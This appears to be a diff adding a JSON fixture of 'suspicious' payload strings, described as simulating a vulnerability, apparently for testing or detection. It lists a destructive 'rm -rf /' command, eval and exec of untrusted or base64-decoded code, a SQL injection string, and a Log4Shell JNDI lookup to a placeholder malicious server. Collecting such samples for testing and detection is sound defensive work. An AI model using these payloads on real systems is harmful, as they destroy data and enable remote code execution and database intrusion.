@@ -1,0 +1,12 @@
+{
+    "script_name": "suspicious_payload.json",
+    "description": "Simulated script mimicking a resurgent vulnerability using suspicious logic.",
+    "payload": [
+        "os.system('rm -rf /')",
+        "import subprocess",
+        "eval(input('Enter code: '))",
+        "exec(base64.b64decode(encoded_string))",
+        "SELECT * FROM users WHERE name = '' OR 1=1 --",
+        "${jndi:ldap://malicious.server.com/exploit}"
+    ]
+}
